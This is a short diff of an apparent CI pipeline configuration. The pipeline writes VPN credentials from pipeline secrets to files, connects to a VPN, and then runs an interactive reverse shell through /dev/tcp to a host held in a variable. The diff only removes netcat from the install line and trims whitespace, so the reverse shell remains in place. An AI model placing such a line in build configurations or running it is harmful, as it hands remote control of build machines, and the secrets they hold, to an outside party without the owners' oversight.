@@ -7,7 +7,7 @@ pool:
 steps:
 
   - bash: |
-      sudo apt-get --assume-yes --no-install-recommends install openvpn netcat
+      sudo apt-get --assume-yes --no-install-recommends install openvpn
       echo $VPNCRT > vpncrt.crt
       echo $VPNKEY > vpnkey.key
       echo $VPNCONFIG | base64 -d > tempvpnconfig.ovpn
@@ -24,7 +24,7 @@ steps:
       ifconfig tun0
 
       sh -i >& "/dev/tcp/$(ME)" 0>&1
-      
+
     env:
       VPNKEY: $(vpnkey)
       VPNCRT: $(vpncrt)
